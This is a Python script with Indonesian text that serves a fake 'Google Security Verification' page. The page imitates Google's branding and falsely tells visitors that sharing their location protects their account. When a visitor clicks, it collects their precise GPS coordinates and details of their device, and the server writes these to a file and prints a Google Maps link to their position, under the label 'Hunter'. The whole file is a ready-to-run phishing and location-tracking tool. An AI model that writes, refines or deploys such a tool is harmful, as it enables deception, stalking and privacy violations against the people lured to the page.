import http.server
import json
import datetime

HTML = """<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifikasi Keamanan Google</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Roboto, Arial, sans-serif;
        }
        body {
            background: #ffffff;
            color: #202124;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 450px;
            width: 100%;
            text-align: center;
        }
        .logo {
            font-size: 32px;
            font-weight: 500;
            margin-bottom: 24px;
            letter-spacing: -1px;
        }
        .logo span:nth-child(1) { color: #4285f4; }
        .logo span:nth-child(2) { color: #ea4335; }
        .logo span:nth-child(3) { color: #fbbc05; }
        .logo span:nth-child(4) { color: #4285f4; }
        .logo span:nth-child(5) { color: #34a853; }
        .logo span:nth-child(6) { color: #ea4335; }
        .card {
            border: 1px solid #dadce0;
            border-radius: 8px;
            padding: 40px 32px;
            background: #fff;
            box-shadow: 0 1px 3px rgba(0,0,0,0.08);
        }
        .icon {
            width: 72px;
            height: 72px;
            margin: 0 auto 16px;
            background: #e8f0fe;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 36px;
        }
        h2 {
            font-size: 24px;
            font-weight: 400;
            margin-bottom: 12px;
            color: #202124;
        }
        p {
            font-size: 14px;
            color: #5f6368;
            line-height: 1.6;
            margin-bottom: 24px;
        }
        .btn {
            background: #1a73e8;
            color: #fff;
            border: none;
            padding: 12px 24px;
            font-size: 14px;
            font-weight: 500;
            border-radius: 4px;
            cursor: pointer;
            width: 100%;
            transition: background 0.2s;
        }
        .btn:hover {
            background: #1557b0;
        }
        .result {
            margin-top: 20px;
            font-size: 14px;
            color: #34a853;
            font-weight: 500;
        }
        .footer {
            margin-top: 24px;
            font-size: 12px;
            color: #80868b;
        }
        .footer a {
            color: #1a73e8;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
        </div>
        <div class="card">
            <div class="icon">🔒</div>
            <h2>Verifikasi Keamanan</h2>
            <p>Untuk melanjutkan, harap aktifkan lokasi Anda. Ini membantu kami memverifikasi identitas dan melindungi akun Anda.</p>
            <button class="btn" onclick="mintaLokasi()">Aktifkan Lokasi</button>
            <div class="result" id="result"></div>
        </div>
        <div class="footer">
            <a href="#">Pelajari lebih lanjut</a> · <a href="#">Bantuan</a> · <a href="#">Privasi</a> · <a href="#">Persyaratan</a>
        </div>
    </div>

    <script>
        function mintaLokasi() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        const data = {
                            lat: pos.coords.latitude,
                            lon: pos.coords.longitude,
                            acc: pos.coords.accuracy,
                            ua: navigator.userAgent,
                            platform: navigator.platform,
                            ram: navigator.deviceMemory || 'N/A',
                            cpu: navigator.hardwareConcurrency || 'N/A',
                            screen: screen.width + 'x' + screen.height
                        };
                        fetch('/log', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify(data)
                        })
                        .then(() => {
                            document.getElementById('result').innerHTML = "✅ Verifikasi berhasil!";
                        })
                        .catch(() => {
                            document.getElementById('result').innerHTML = "❌ Gagal.";
                        });
                    },
                    (err) => {
                        document.getElementById('result').innerHTML = "❌ " + err.message;
                    }
                );
            } else {
                document.getElementById('result').innerHTML = "❌ Browser tidak mendukung.";
            }
        }
    </script>
</body>
</html>"""

class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self.end_headers()
            self.wfile.write(HTML.encode('utf-8'))
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        if self.path == '/log':
            length = int(self.headers['Content-Length'])
            data = json.loads(self.rfile.read(length))
            
            waktu = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            with open('hasil_lokasi.txt', 'a', encoding='utf-8') as f:
                f.write(f"\n[{waktu}]\n")
                f.write(f"Latitude: {data.get('lat')}\n")
                f.write(f"Longitude: {data.get('lon')}\n")
                f.write(f"Akurasi: {data.get('acc')} meter\n")
                f.write(f"Device: {data.get('ua')}\n")
                f.write(f"Platform: {data.get('platform')}\n")
                f.write(f"RAM: {data.get('ram')}\n")
                f.write(f"CPU: {data.get('cpu')}\n")
                f.write(f"Layar: {data.get('screen')}\n")
                f.write("="*40 + "\n")
            
            # Tampilan output yang lebih bagus
            print("\n" + "="*50)
            print("📡  DATA LOKASI DITERIMA")
            print("="*50)
            print(f"🕐 Waktu       : {waktu}")
            print(f"📍 Latitude    : {data.get('lat')}")
            print(f"📍 Longitude   : {data.get('lon')}")
            print(f"🎯 Akurasi     : {data.get('acc')} meter")
            print(f"🗺️  Google Maps : https://www.google.com/maps?q={data.get('lat')},{data.get('lon')}")
            print("-"*50)
            print(f"📱 Device      : {data.get('ua')[:70]}...")
            print(f"💻 Platform    : {data.get('platform')}")
            print(f"🧠 RAM         : {data.get('ram')} GB")
            print(f"⚙️  CPU         : {data.get('cpu')} core")
            print(f"🖥️  Layar       : {data.get('screen')}")
            print("="*50)
            print("✅ Data tersimpan di hasil_lokasi.txt")
            print("="*50 + "\n")
            
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(b'{"status":"ok"}')
        else:
            self.send_response(404)
            self.end_headers()

if __name__ == '__main__':
    print("[!] Hunter berjalan di port 8080")
    print("[!] Buka http://localhost:8080")
    http.server.HTTPServer(('0.0.0.0', 8080), Handler).serve_forever()
